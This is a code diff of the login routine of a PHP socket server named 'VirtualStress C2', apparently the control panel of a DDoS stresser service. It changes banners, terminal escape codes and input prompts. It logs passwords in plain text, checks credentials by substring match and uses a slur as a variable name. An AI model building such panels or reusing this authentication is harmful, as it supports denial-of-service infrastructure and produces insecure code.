@@ -54,24 +54,30 @@ while (true)
 
     if ($newsock = @socket_accept($sock))
     {
-        socket_write($newsock, $banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
-        socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
+        socket_write($newsock, $banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
+        socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
+        socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
+        // socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
         socket_getpeername($newsock, $client_ip, $client_port);
-        $usrname = alt_getInput($newsock, "Username: ", 3);
-        $passwd = alt_getInput($newsock, "Password: ", 3);
+        $usrname = alt_getInput($newsock, 3);
+        socket_write($newsock, $config->Colors["Clear"], strlen($config->Colors["Clear"]));
+        socket_write($newsock, $banner->passwd_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->passwd_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
+        socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
+        socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
+        $passwd = alt_getInput($newsock, 3);
         echo "# [ NEW LOGIN ATTEMPT ] #\r\n$usrname | $passwd\r\n\r\n";
         $gay = $crud->user($client_ip, "all");
         $user_info = explode(",", $gay);
         if(strpos($usrname, $user_info[0]) !== false && strpos($passwd, $user_info[2]) !== false) {
             if($client_ip == $user_info[1]) {
-                socket_write($newsock, "[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn", strlen("[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn"));
+                socket_write($newsock, $config->Colors["Clear"]. "[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn", strlen($config->Colors["Clear"]. "[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn"));
             } else {
-                socket_write($newsock, "[x] Invalid matching IP!", strlen("[x] Invalid matching IP!"));
+                socket_write($newsock, $config->Colors["Clear"]. $config->Colors["Red"]. "[x] Invalid matching IP!", strlen($config->Colors["Clear"]. "[x] Invalid matching IP!"));
                 sleep(1);
                 socket_close($newsock);
             }
         } else {
-            socket_write($newsock, "[x] Invalid Info\r\n", strlen("[x] Invalid Info\r\n"));
+            socket_write($newsock, $config->Colors["Clear"]. $config->Colors["Red"]. "[x] Invalid Info\r\n", strlen($config->Colors["Clear"]. "[x] Invalid Info\r\n"));
             sleep(1);
             socket_close($newsock);
         }
@@ -150,11 +156,11 @@ while (true)
     // sleep(1);
 }
 
-function alt_getInput($socket, $str, $i) {
+function alt_getInput($socket, $i) {
     $FetchedInput = "";
     $checking_characters = false;
 
-    socket_write($socket, $str, strlen($str));
+    // socket_write($socket, $str, strlen($str));
     sleep($i);
     $sokc = socket_recv($socket, $string, 1024, MSG_DONTWAIT);
     $FetchedInput = $string;
